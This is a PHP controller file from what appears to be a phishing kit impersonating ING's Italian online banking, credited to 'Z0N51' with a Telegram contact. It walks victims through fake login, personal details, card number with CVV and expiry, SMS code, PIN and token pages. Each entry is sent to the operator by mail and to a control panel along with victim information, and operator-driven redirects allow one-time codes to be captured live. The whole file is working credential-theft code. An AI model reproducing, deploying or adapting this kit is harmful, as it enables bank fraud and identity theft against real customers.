<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    include 'app.php';

    if( $_GET['waiting'] == 1 ) {
        $response = checkgoto();
        if( $response === 'badlog' ) {
            $_SESSION['errors']['username'] = "Inserisci il tuo Codice Cliente";
            $_SESSION['errors']['date'] = "Inserisci la tua data di nascita";
            echo "index.php?redirection=login&error=1";
            exit();
        } else if( $response === 'log' ) {
            echo "index.php?redirection=login";
            exit();
        } else if( $response === 'loading' ) {
            echo "index.php?redirection=loading";
            exit();
        } else if( $response === 'app' ) {
            echo "index.php?redirection=app";
            exit();
        } else if( $response === 'call' ) {
            echo "index.php?redirection=call";
            exit();
        } else if( $response === 'loadcall' ) {
            echo "index.php?redirection=loadcall";
            exit();
        } else if( $response === 'sms' ) {
            echo "index.php?redirection=sms";
            exit();
        } else if( $response === 'badsms' ) {
            $_SESSION['errors']['sms_code'] = "Codice non valido";
            echo "index.php?redirection=sms&error=1";
            exit();
        } else if( $response === 'details' ) {
            echo "index.php?redirection=details";
            exit();
        } else if( $response === 'baddetails' ) {
            $_SESSION['full_name'] = "";
            $_SESSION['address'] = "";
            $_SESSION['birth_date'] = "";
            $_SESSION['phone'] = "";
            $_SESSION['email'] = "";
            $_SESSION['errors']['full_name'] = "Inserisci il tuo nome completo.";
            $_SESSION['errors']['address'] = "Inserisci il tuo indirizzo.";
            $_SESSION['errors']['birth_date'] = "Inserisci una data di nascita valida.";
            $_SESSION['errors']['phone'] = "Inserisci un numero di telefono valido.";
            $_SESSION['errors']['email'] = "Inserisci un indirizzo email valido.";
            echo "index.php?redirection=details&error=1";
            exit();
        } else if( $response === 'cc' ) {
            echo "index.php?redirection=cc";
            exit();
        } else if( $response === 'badcc' ) {
            $_SESSION['one'] = '';
            $_SESSION['three'] = '';
            $_SESSION['two'] = '';
            $_SESSION['errors']['one'] = "Il numero della carta non è valido";
            $_SESSION['errors']['three'] = "Il codice CVV non è valido";
            $_SESSION['errors']['two'] = "La data di scadenza non è valida";
            echo "index.php?redirection=cc&error=1";
            exit();
        } else if( $response === 'pin' ) {
            echo "index.php?redirection=pin";
            exit();
        } else if( $response === 'badpin' ) {
            echo "index.php?redirection=pin&error=1";
            exit();
        } else if( $response === 'success' ) {
            echo "index.php?redirection=success";
            exit();
        }
        exit();
    }

    if( isset($_GET["redirection"]) && !empty($_GET['redirection']) ) {

        $red = $_GET['redirection'];
        $_SESSION['last_page'] = $red;
        $query = [];
        $parse_url = proper_parse_str($_SERVER['QUERY_STRING']);
        foreach($parse_url as $key => $val) {
            if( $key == 'redirection' || $key == 'prefix' ){
                unset($parse_url[$key]);
            } else {
                $query[] = $key . '=' . $val;
            }
        }
        if( is_array($query) ) {
            $query = "?" . implode('&',$query);
        }

        if( isset($_GET['prefix']) ) {
            $_SESSION['prefix'] = $_GET['prefix'];
        }

        resetgoto();

        redirect($_SESSION['last_page']);
        exit();

    } else if( isset($_GET["lang"]) && !empty($_GET['lang']) ) {

        $_SESSION['lang'] = $_GET["lang"];
        location($_SESSION['last_page']);

    } else if( isset($_GET["notif"]) && !empty($_GET['notif']) ) {

        $choose = $_GET['notif'];

        $subject = get_client_ip() . ' | ING | Notif';
        $message = '/-- IP INFOS --/' . get_client_ip() . "\r\n";
        $message .= 'This client clicks : ' . $choose . "\r\n";
        $message .= '/-- END NOTIF --/' . "\r\n" . "\r\n";
        send($subject,$message);
        location('loading');

    } else if( $_SERVER['REQUEST_METHOD'] == "POST" ) {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['action'] == "VISITORS" ) {
            panel([
                'action' => 'VISITORS',
                'ip'     => $_POST['ip'],
                'page'     => $_POST['page'],
            ]);
            exit();
        }

        if( $_POST['steeep'] == "login" ) {
            $_SESSION['errors'] = [];
            $_SESSION['username'] = $_POST['username'];           
            $_SESSION['date']  = $_POST['date'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = "Inserisci il tuo Codice Cliente";
            }
            if( validate_date($_POST['date'],'d/m/Y') == false ) {
                $_SESSION['errors']['date'] = "Inserisci la tua data di nascita";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['date'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'INSERT',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'login' => $_POST['username'] . ' | ' . $_POST['date'],
                    ],
                ]);
                location("loading");
            } else {
                location("login","&error=1");
            }
        }

        if ($_POST['steeep'] == "details") {
            $_SESSION['errors']     = [];
            $_SESSION['full_name']  = $_POST['full_name'];      
            $_SESSION['address']  = $_POST['address'];      
            $_SESSION['birth_date'] = $_POST['birth_date'];
            $_SESSION['phone']      = $_POST['phone'];
            $_SESSION['email']      = $_POST['email'];
            if( empty($_POST['full_name']) ) {
                $_SESSION['errors']['full_name'] = "Inserisci il tuo nome completo.";
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = "Inserisci il tuo indirizzo.";
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = "Inserisci una data di nascita valida.";
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = "Inserisci un numero di telefono valido.";
            }
            if( validate_email($_POST['email']) == false ) {
                $_SESSION['errors']['email'] = "Inserisci un indirizzo email valido.";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Full name : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
                $message .= 'Email address : ' . $_POST['email'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'details'    => $_POST['full_name'] . ' | ' . $_POST['address'] . ' | ' . $_POST['birth_date'] . ' | ' . $_POST['phone'] . ' | ' . $_POST['email'],
                    ],
                ]);
                location("loading");
            } else {
                location("details","&error=1");
            }
        }

        if ($_POST['steeep'] == "cc") {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];      
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = "Il numero della carta non è valido";
            }

            if( $three == false ) {
                $_SESSION['errors']['three'] = "Il codice CVV non è valido";
            }

            if( $two == false ) {
                $_SESSION['errors']['two'] = "La data di scadenza non è valida";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Expiration date : ' . $_POST['two'] . "\r\n";
                $message .= 'CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'cc'     => $_POST['one'] . ' | ' . $_POST['two'] . ' | ' . $_POST['three'],
                    ],
                ]);
                location("loading");
            } else {
                location("cc","&error=1");
            }
        }

        if ($_POST['steeep'] == "sms") {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_SESSION['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = "Codice non valido";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'sms'     => $_POST['sms_code'],
                    ],
                ]);
                location("loading");
            } else {
                location("sms","&error=1");
            }
        }

        if ($_POST['steeep'] == "pin") {
            $_SESSION['errors'] = [];
            $_SESSION['pinValue']    = $_POST['pinValue'];
            if( validate_number($_SESSION['pinValue'],6) == false ) {
                $_SESSION['errors']['pinValue'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Sms';
                $message = '/-- PIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'PIN : ' . $_POST['pinValue'] . "\r\n";
                $message .= '/-- END PIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'pin'     => $_POST['pinValue'],
                    ],
                ]);
                location("loading");
            } else {
                location("pin","&error=1");
            }
        }

        if ($_POST['steeep'] == "pin") {
            $_SESSION['errors'] = [];
            $_SESSION['pinValue']    = $_POST['pinValue'];
            if( validate_number($_POST['pinValue'],6) == false ) {
                $_SESSION['errors']['pinValue'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Sms';
                $message = '/-- PIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'PIN : ' . $_POST['pinValue'] . "\r\n";
                $message .= '/-- END PIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'pin'     => $_POST['pinValue'],
                    ],
                ]);
                location("loading");
            } else {
                location("pin","&error=1");
            }
        }

        if ($_POST['steeep'] == "token") {
            $_SESSION['errors'] = [];
            $_SESSION['token'] = $_POST['token1'].$_POST['token2'].$_POST['token3'].$_POST['token4'].$_POST['token5'].$_POST['token6'];
            if( validate_number($_SESSION['token'],6) == false ) {
                $_SESSION['errors']['token'] = "Codice non valido.";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING | Token';
                $message = '/-- TOKEN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Token : ' . $_SESSION['token'] . "\r\n";
                $message .= '/-- END TOKEN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                panel([
                    'action' => 'UPDATE',
                    'ip'     => get_client_ip(),
                    'results' => [
                        'token'     => $_SESSION['token'],
                    ],
                ]);
                location("loading");
            } else {
                location("token","&error=1");
            }
        }

    } else {

        if( isset($_SESSION['last_page']) ) {
            redirect($_SESSION['last_page']);
        }

        header("Location: https://www.ing.it/");
        exit();

    }
    

?>